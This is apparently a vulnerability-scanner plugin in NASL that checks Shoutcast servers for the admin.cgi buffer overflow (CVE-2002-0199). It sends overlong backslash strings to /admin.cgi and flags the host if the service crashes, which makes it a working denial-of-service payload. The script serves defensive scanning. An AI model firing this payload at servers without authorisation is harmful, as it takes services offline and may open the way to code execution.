if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11719" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 3934 );
	script_cve_id( "CVE-2002-0199" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "admin.cgi overflow" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2003 Michel Arboi" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_get_http_banner.sc", "embedded_web_server_detect.sc" );
	script_require_ports( "Services/www", 8888 );
	script_mandatory_keys( "shoutcast/banner" );
	script_tag( name: "solution", value: "Upgrade Shoutcast to the latest version." );
	script_tag( name: "summary", value: "The Shoutcast server crashes when a too long argument is
  given to admin.cgi" );
	script_tag( name: "impact", value: "An attacker may use this flaw to prevent your server from
  working, or worse, execute arbitrary code on your system." );
	script_tag( name: "affected", value: "Shoutcast server 1.8.3 is known to be affected." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 8888 );
if(http_get_is_marked_embedded( port: port )){
	exit( 0 );
}
if(http_is_dead( port: port, retry: 0 )){
	exit( 0 );
}
banner = http_get_remote_headers( port: port );
if(!egrep( pattern: "shoutcast", string: banner, icase: TRUE )){
	exit( 0 );
}
url = NASLString( "/admin.cgi?pass=", crap( length: 4096, data: "\\" ) );
req = http_get( item: url, port: port );
res = http_send_recv( port: port, data: req );
url = NASLString( "/admin.cgi?", crap( length: 4096, data: "\\" ) );
req = http_get( item: url, port: port );
res = http_send_recv( port: port, data: req );
if(http_is_dead( port: port )){
	report = http_report_vuln_url( port: port, url: "/admin.cgi" );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

